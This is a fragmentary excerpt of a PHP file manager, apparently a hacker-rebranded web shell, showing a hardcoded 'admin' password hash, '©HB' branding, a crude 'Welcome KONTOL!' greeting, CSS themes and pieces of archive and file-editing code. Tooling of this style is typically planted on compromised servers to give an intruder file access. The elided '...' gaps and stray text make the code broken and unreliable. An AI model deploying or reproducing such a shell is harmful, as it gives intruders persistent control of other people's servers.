<?php
    ...
    $use_auth = true;
    $auth_users = array(
        'admin' => '$2y$10$hOzegKzS0qZO/iN1u77MO..gLiEe2OZyGpWEh88rkCgSeRfXet/0C',
    );
    ...
    <form action="" method="post" class="pt-3">
        ...
        <div class="row">
            ...
            <div class="col-3 d-none d-sm-block"><a class="float-right text-muted">&copy;HB</a></div>
            <?PHp else: ?>
            <div class="col-3 d-none d-sm-block"><a class="float-right text-muted">&copy;HB</a></div>
            <?PHp endif; ?>
        </div>
    ...
    class FM_Zipper_Tar
    {
        ...
        private function addDir($path)
        {
            $objects = scandir($path);
            if (is_array($objects)) {
                foreach ($objects as $file) {if ($file != '.' && $file != '..') {
                        if (is_dir($path . '/' . $file)) {
                            if (!$this->addDir($path . '/' . $file)) {
                                return false;
                            }
    ...
    <head>
        ...
        <style>
            ...
            .message{ padding:4px 7px;border:1px solid #ab00ff;background-color:#fff}
            .message.ok{ border-color:ab00ff;color:00b1ff}
            .message.error{ border-color:red;color:red}
            .message.alert{ border-color:orange;color:orange}
            body.fm-login-page.theme-dark {background-color: #0012c9;}
    ...
    <head>
        ...
        <style>
            ...
            *,*::before,*::after { box-sizing: border-box;}
            body { font-size:15px; color:#00f1ff;background:#F7F7F7; }
            ...
            .break-word + .float-right { padding-right:30px;position:relative  }fHB
            ...
            table.dataTable thead .sorting { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('https://i.pinimg.com/originals/98/9b/20/989b2075acee4875c6a36e2a66b2fa71.gif'); }
            table.dataTable thead .sorting_asc { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('https://i.pinimg.com/originals/98/9b/20/989b2075acee4875c6a36e2a66b2fa71.gif'); }
            table.dataTable thead .sorting_desc { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('https://i.pinimg.com/originals/98/9b/20/989b2075acee4875c6a36e2a66b2fa71.gif'); }
        ...
        if (FM_THEME == "dark"): ?>
            <style>
                ...
                body.theme-dark { background-image: linear-gradient(90deg, #3e0443, #043d5c); color: #00b1ff; }
        ...
        function edit_save(e, t) {
            ...
            if (typeof n !== 'undefined' && n !== null) {
                if (true) {
                    ...
                    a.setAttribute("method", "POST"), a.setAttribute("action", "");var o = document.createElement("textarea");
    ...
    function lng($txt) {
        ...
        $tr['en']['HideColumns']    = 'Hide Perms/Owner columns';$tr['en']['Welcome KONTOL!']     = 'Welcome KONTOL!';
